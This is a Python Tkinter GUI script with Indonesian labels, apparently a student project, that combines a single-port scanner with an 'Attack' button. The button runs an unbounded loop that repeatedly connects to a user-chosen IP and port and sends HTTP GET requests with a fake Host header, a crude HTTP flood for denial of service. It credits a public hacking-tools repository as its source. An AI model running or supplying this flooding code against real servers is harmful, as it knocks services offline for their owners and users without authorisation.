from tkinter import *
from tkinter.ttk import *
import socket
import time
from time import time as tt
import random
import os

attack_num = 0

def clicked2():
	targetnya = ip.get()
	portnya = int(port.get())
	fakeip = '182.21.20.32'
	def attack(target, port, fake_ip):
		while 100:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((target, port))
			s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
			s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
			
			lbl3.configure(text="[~] Lagi Attack!")
			global attack_num
			attack_num += 1
			lbl4.configure(text="Attack sebanyak "+str(attack_num))
			
			s.close()
	attack(targetnya, portnya, fakeip)

def clicked():
	ipadress = ip.get()
	portnya = int(port.get())
	lbl3.configure(text="[~] Lagi scan, tunggu!")
	def do_it(ip, port):
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock = sock.connect_ex((ip, port))
		if sock == 0:
			res = "[*] Port " + str(portnya) +" dari IP " + ipadress + " open"
			lbl4.configure(text= res)
		else:
			lbl4.configure(text="[*] Port Tertutup!")
	
	do_it(ipadress, portnya)
	lbl3.configure(text="[~] Selesai scan!")
		
	
window = Tk()
window.title("Tools Scanner Port | Latisha Safa")

window.geometry('550x300')
window.resizable(width=0, height=0)

lbl = Label(window, text="Latisha Safa | III RKS Echo")
lbl.grid(columnspan=2, row=0, pady=20)

lbl = Label(window, text="IP NYA :")
lbl.grid(column=0, row=1)
ip = Entry(window)
ip.grid(column=1, row=1)

lbl2 = Label(window, text="PORT NYA :")
lbl2.grid(column=0, row=2, padx=10)
port = Entry(window)
port.grid(column=1, row=2, padx=10)

btn = Button(window, text="Scan", command=clicked)
btn.grid(column=0, row=3, pady=30, padx=20)

btnserang = Button(window, text="Attack", command=clicked2)
btnserang.grid(column=1, row=3, pady=30, padx=20)

lbl3 = Label(window, text="")
lbl3.grid(columnspan=2, row=4)

lbl4 = Label(window, text="")
lbl4.grid(columnspan=2, row=5)

lbldesc = Label(window, text="INFO")
lbldesc.grid(column=3, row=0, pady=20)

lbldesc2 = Label(window, text="Sumber kode tools : \nhttps://github.com/thehackings\nage/hacktronian/blob/master/ha\ncktronian.py")
lbldesc2.grid(column=3, row=1, padx=20)

window.mainloop()
